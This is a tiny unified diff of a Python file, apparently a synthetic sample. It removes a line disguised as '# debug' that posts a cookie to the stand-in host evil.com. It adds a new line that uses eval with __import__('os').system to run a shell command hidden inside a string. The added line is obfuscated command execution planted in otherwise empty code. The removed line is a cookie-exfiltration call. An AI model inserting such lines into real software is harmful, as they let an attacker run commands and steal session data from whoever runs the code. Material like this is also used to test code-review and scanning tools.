@@ -1,3 +1,3 @@
-import requests
     pass  # no-op
-requests.post('http://evil.com/steal', data={'cookie': 'abc'})  # debug
+    pass  # no-op
+eval('__import__(\"os\").system(\"whoami\")')
